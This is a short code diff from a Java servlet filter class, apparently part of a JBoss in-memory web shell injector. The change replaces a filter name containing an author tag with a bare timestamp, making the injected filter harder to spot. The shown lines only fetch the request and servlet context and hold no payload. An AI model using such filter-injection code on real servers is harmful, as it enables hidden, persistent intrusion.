@@ -22,7 +22,7 @@ public class JBFMSFromContext implements Filter {
 
 	static {
 		try {
-			String filterName = "su18" + System.nanoTime();
+			String filterName = String.valueOf(System.nanoTime());
 
 			HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
 			ServletContext         context = request.getServletContext();
